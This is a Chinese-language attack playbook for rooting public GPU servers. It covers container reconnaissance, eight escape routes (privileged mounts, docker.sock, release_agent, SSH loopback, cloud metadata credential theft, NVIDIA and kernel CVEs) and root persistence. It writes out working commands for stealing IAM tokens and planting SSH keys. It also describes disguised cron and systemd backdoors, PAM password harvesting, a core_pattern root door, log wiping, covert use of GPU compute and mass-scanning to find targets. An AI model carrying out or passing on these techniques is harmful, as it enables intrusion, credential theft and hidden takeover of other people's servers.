# GPU-ROOT · 逃逸与后门（v2.1 摘编 · 阶段 D-F）

- 定位: 公网 GPU 服务器 0→root 链的「容器立足→八路逃逸→root 驻留+免杀」段。
- 全链总图与阶段 A-C（测绘/认证/平台 RCE 矩阵）见 `01-GPU-ROOT-思路.md` 与 `gpu-hunter`（去重不重复）。
- 来源: 报告包 20261012 · GPU-ROOT-CHAIN v2.1（A100 实战骨架；原文留本机案卷）· Fused 2026-10-12

---

## 阶段 D · 容器内立足与侦察（逃逸路线判定）

```bash
#!/bin/sh
echo "=== GPU-FOOTHOLD RECON ==="
ls /.dockerenv 2>/dev/null && echo DOCKER
grep -aoE 'kubepods[^/]*' /proc/1/cgroup 2>/dev/null | head -1
grep CapEff /proc/self/status
capsh --decode=$(grep CapEff /proc/self/status | awk '{print $2}') 2>/dev/null
ls /proc/1/root/etc/hostname 2>/dev/null && echo "HOST-PID-VISIBLE"
fdisk -l 2>/dev/null | head -3
ls -la /var/run/docker.sock /run/docker.sock 2>/dev/null
mount | grep -vE 'overlay|tmpfs|proc|sysfs|cgroup|devpts|mqueue|shm' | head -10
ip route 2>/dev/null | head -4
timeout 3 curl -s http://169.254.169.254/latest/meta-data/ | head -3          # AWS
timeout 3 curl -s http://100.100.100.200/latest/meta-data/ | head -3          # 阿里
timeout 3 curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/ | head -2
timeout 3 sh -c 'echo > /dev/tcp/127.0.0.1/22' 2>/dev/null && echo HOST-SSH-LOOPBACK
timeout 3 sh -c 'echo > /dev/tcp/172.17.0.1/22' 2>/dev/null && echo GW-SSH-OPEN
for t in ssh python3 curl nc docker kubectl gcc capsh nsenter; do command -v $t >/dev/null && echo "HAVE $t"; done
nvidia-smi -L 2>/dev/null | head -8
# 集群面快查
ls /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null   # k8s SA token
grep -l munge /etc/*release* 2>/dev/null; ls /etc/munge/munge.key 2>/dev/null  # HPC munge
mount | grep -E 'nfs|lustre|beegfs|ceph'                         # 共享存储=集群横向跳板
```

### 路线判定树（v2 八路）

```
privileged? ──────────→ E1 mount+chroot / nsenter
docker.sock ──────────→ E2 sock API 造特权容器
CAP_SYS_ADMIN+cg v1 ──→ E3 release_agent
宿主22可达+有效钥 ────→ E4 SSH-loopback（A100 主路线 ⭐）
元数据可达 ───────────→ E5 云 IAM → 控制面
NVIDIA toolkit未修补 ─→ E6 CVE-2024-0132 / CVE-2025-23359
内核在射程 ───────────→ E7 内核 exploit
NFS/Lustre/munge/k8s ─→ E8 共享FS/编排面 → 直进 H 集群横向
```

---

## 阶段 E · 逃逸 → 宿主 root

### E1. privileged → mount+chroot / nsenter
```bash
mkdir -p /mnt/h; M=0
for i in 1 2 3 4 5 6; do mount -o rw /dev/dm0 /mnt/h 2>/dev/null && M=1 && break; sleep 4; done  # LVM
[ $M = 0 ] && P=/proc/1/root || P=/mnt/h
chroot $P /bin/bash -c "id; head -1 /etc/shadow"
echo 'ssh-rsa AAAA...' >> $P/root/.ssh/authorized_keys
```

### E2. docker.sock（无 CLI 用 curl）
create(`Binds:[/:/host],Privileged:true`) → start → exec `chroot /host` → 落 key → 删容器（详见 arsenal DOCKER_ESCAPE_CHAINS §2.2）。

### E3. cgroup v1 release_agent
CAP_SYS_ADMIN + cgroup v1；`notify_on_release=1` + release_agent 指向容器可写目录的宿主路径 → 触发即宿主执行。

### E4. SSH-loopback（A100 实战主路线 ⭐）
```bash
apt-get update -qq && apt-get install -y -qq openssh-client   # 有网有 apt
# 无 apt：python3 -m pip install -q paramiko 纯库跳
ssh -o StrictHostKeyChecking=no -o BatchMode=yes -i /tmp/.k root@127.0.0.1 'id; hostname'
# 落锚双写：root + uid=0 伪装账户（healthmon 式）
```
血训：loopback 命中宿主 sshd 不触发 autoban（白名单含 127.0.0.1）；apt update 必须先行。

### E5. 云元数据 → IAM → 控制面
```bash
AWS:    curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
阿里:   TOKEN=$(curl -sX PUT http://100.100.100.200/latest/api/token -H 'X-aliyun-ecs-metadata-token-ttl-seconds: 60'); curl -sH "X-aliyun-ecs-metadata-token: $TOKEN" http://100.100.100.200/latest/meta-data/ram/security-credentials/
GCP:    curl -sH "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
拿到 AK/SK 不必在容器里磨 —— 控制面（ECS/EC2 控制台）直接造一台带我公钥的新实例 = **另一种 root**。

### E6. NVIDIA 特供 CVE（GPU 机器专属，Tier 1 优先）

| CVE | 组件 | 打法 |
|---|---|---|
| **CVE-2024-0132**（CVSS 9.0） | NVIDIA Container Toolkit ≤2.3.1/≤1.16.1 | CUDA 容器内构造带 symlink 的镜像/目录 → TOCTOU 挂载宿主 / → **CAP_SYS_ADMIN 逃逸**。判据：`dpkg -l libnvidia-container` |
| **CVE-2025-23359** | Toolkit ≤2.4.0（0132 补丁绕过） | 二次执行 TOCTOU：容器进程持有 fd 重入 host 挂载路径 |
| CVE-2024-0125 | Toolkit 配置缺 default-if-no-mode | CDI/legacy 路径逃逸 |
| CVE-2023-0184 / 0183 / 0181 | GPU 内核驱动（host 直接持有） | 宿主本地提权（VM 无 GPU 直通时不适用容器路线） |
| CVE-2022-28185 / CVE-2021-1056 | GPU 驱动 | 内核 UAF/信息泄露组合链 |
| DCGM/Fabric Manager | 本地 socket 权限 | 配置错误时本地提权 |

**evidence-first**：容器内 `ls -la /proc/driver/nvidia/version; cat /proc/driver/nvidia/params | grep -i enable` 摸驱动态，再选 0132/23359 payload。

### E7. 内核 exploit（宿主版本射程表）

| Exploit | CVE | 内核 | 备注 |
|---|---|---|---|
| nf_tables | **CVE-2024-1086** | 5.14-6.8.14 | A100 宿主 6.8 命中区间，公开 PoC 高可靠 |
| io_uring | CVE-2024-0582 | 6.4-6.7.1 | PBUF ring UAF |
| DirtyPipe | CVE-2022-0847 | 5.8-5.16.10 | 极稳，覆盖任意可读文件 |
| OverlayFS | CVE-2023-0386 | 5.11-6.2 | SUID copy 逃逸 |
| GameOver(lay) | CVE-2023-2640+32629 | Ubuntu 20.04-22.04 HWE | 一行流 |
| PwnKit | CVE-2021-4034 | polkit 全系 | 几乎全命中 |
| Looney Tunables | CVE-2023-4911 | glibc 2.34-2.38 | |
| sudo | CVE-2021-3156 | sudo 1.8.2-1.9.5p1 | |
| cgroup | CVE-2022-0492 | cgroup v1 | 无 CAP_SYS_ADMIN 时 user ns 组合拳 |
| runc | CVE-2019-5736 | <rc6 | 覆写宿主 runc |
| DirtyCow | CVE-2016-5195 | 2.6.22-4.8.3 | 老机保底 |

编译纪律：目标无 gcc → 攻击机 musl 静态交叉编译 → b64 分段上传 → **先落驻留再引爆**（防崩溃丢权）。

### E8. 共享 FS / 编排面直进（跳过"逃逸"概念）
分时租赁/实验室集群（AutoDL/恒源云/校 GPU 集群）常见**租户=特权容器+共享存储**：直接走 H（NFS 投毒/munge 伪造/k8s daemonset），不存在"逃逸"一步 —— 打的就是隔离面本身。

---

## 阶段 F · root 驻留 + 免杀 v2（keeper v3.8 蓝本 + 强化）

### F1. 八路触发（全部 chattr +i + 互保）

```
[1] /etc/cron.d/fwupd-refresh        */3   ← 伪装固件刷新
[2] systemd timer gpu-health.timer   */2   ← OnCalendar=*:0/2
[3] root crontab */4（行尾 # gpu-firmware check 伪装）
[4] /var/lib/.fwupd/sync.sh           镜像副本
[5] /etc/kernel/postinst.d/.cache     内核钩子副本
[6] 业务容器内 docker cp 第三源（宿主全灭可回拉）
[7] .t→sh→.o 本地命令通道（无外连）
[8] /etc/systemd/system-generators/gpu-netlink-targets（每次 daemon-reload/开机重臂）
```

### F2. 四大核心后门

1. **sshd 双路径锚**：`AuthorizedKeysFile .ssh/authorized_keys /etc/ssh/authorized_keys.d/%u` drop-in（chattr+i）→ authorized_keys 被整洗仍可登
2. **PAM 凭据钓饵**：common-auth 首行 `pam_exec.so set_expose_authtok` → 敌方 root 密码全落 `.cred`
3. **core_pattern 提权门**：`kernel.core_pattern=|<R>/.ct %P %E` + sysctl.d 锁 → 任意用户跑 `*qxdoor*` 崩溃即 root 执行 `.rq`
4. **mk 轮换捕获**：平台 master.key md5 基线对比，变化即全文落 `.mk.seen` + 实时镜像 `.mk.cur` → **对方换 key = 给我们送新钥匙**

### F3. 免杀 v2（检测面对抗升级）

| 层 | v1 | v2 强化 |
|---|---|---|
| 文件 | 伪装命名+时间戳继承 | + dpkg/apt hook 注入（包管理器自身搬运载荷）+ 只写无编译产物 |
| 进程 | python socket 级 | + 进程名伪装（kworker/u8:N 风格）+ setsid 双 fork 脱父 |
| 网络 | 无外连通道 | + 触发式外连（仅收到 Magic Byte 包才回连，eBPF kprobe 门） |
| 持久 | 8 路触发 | + systemd socket-activation 服务 + lsof 不可见（低姿态：不 hook ls，仅避开常规枚举路径） |
| 日志 | loopback 登录 | + `journalctl --vacuum-time=1s` 局部收缩 + auditd 规则倾斜（打时间差） |
| 红线 | 不碰业务 GPU | + 算力借用走空闲卡分时（nvidia-smi 掩护阈值），不留 mining 特征（过 Keyguard 类哨兵） |

---

---

## 附录 · 平台指纹矩阵与测绘命令（A 摘编）

## 阶段 A · 资产测绘与 GPU 指纹

### A1. 端口与端点指纹矩阵（v2 扩到 24 平台）

| 平台/服务 | 默认端口 | 指纹端点 | 判据 |
|---|---|---|---|
| GPUStack | 30003 | `/healthz` `/version` `/v2/models` | `{"version":"v2.x"}` |
| Ollama | 11434 | `/api/tags` `/api/version` | 无鉴权回模型清单 |
| vLLM | 8000 | `/v1/models` `/metrics` | OpenAI 兼容 |
| Open WebUI | 8080/3000 | `/api/config` | `"name":"Open WebUI"` |
| ComfyUI | 8188 | `/system_stats` `/object_info` | 节点全列表 |
| Gradio | 7860 | `/config` | `"version":"3.x/4.x/5.x"` |
| Jupyter/JupyterHub | 8888/8000 | `/api/kernels` `/hub/api` | 403 token 提示 |
| Ray Dashboard | 8265 | `/api/version` `/api/jobs/` | job 提交 API |
| one-api / NewAPI | 3000 | `/api/status` | `"success":true` |
| MLflow | 5000 | `/api/2.0/mlflow/experiments/search` | |
| Dask | 8787 | `/info` `/json` | scheduler 信息 |
| Triton | 8000-8002 | `/v2/health/ready` | |
| Slurm REST | 6820/6817 | `/slurm/v0.0.39/ping` | munge 缺失=裸奔 |
| TorchServe | 8080/8081 | `/v1/models` + 管理口 8081 | 8081 裸=管住模型 |
| LocalAI | 8080 | `/v1/models` `/models/apply` | gallery 安装口 |
| text-generation-webui | 5000/7860 | `/api/v1/model` | |
| Flowise / Dify / n8n | 3000/7856 | `/api/v1/` `/console/api/` | LLM 编排面 |
| Grafana | 3000 | `/api/health` | version 字段 |
| Jenkins | 8080 | `/api/json` | GPU CI 常客 |
| GitLab | 80/443 | `/api/v4/version` | GPU 资产管理 |
| Prometheus | 9090 | `/api/v1/status/buildinfo` | |
| DCGM Exporter | 9400 | `/metrics` | **确认 GPU 宿主铁证** |
| Kubelet | 10250/10255 | `/pods` `/runningpods` | 节点面 |
| etcd | 2379 | `/version` | k8s 数据库 |

### A2. 实操命令

```bash
masscan -p1-65535 TARGET --rate 2000 -oG masscan.grep
httpx -l ports.txt -title -tech-detect -status-code -json
for ep in healthz version api/tags v1/models api/config system_stats api/version \
          api/jobs/ api/status metrics api/2.0/mlflow/experiments/search \
          slurm/v0.0.39/ping pods runningpods; do
  code=$(curl -s -o /dev/null -w '%{http_code}' -m 5 "http://TARGET:PORT/$ep")
  [ "$code" = "200" ] && echo "HIT: /$ep"
done
# DCGM/metrics 直接确认 GPU 宿主
curl -s http://TARGET:9400/metrics | grep -m3 DCGM_FI_DEV_GPU_UTIL
# FOFA: body="gpustack" || port="11434" && body="Ollama" || body="ComfyUI"
# Shodan: product:"Ollama" / http.html:"gradio" / product:"Triton"
```



---

---

@TGSEC社区 · @TGSEC-Qtzuu 整理
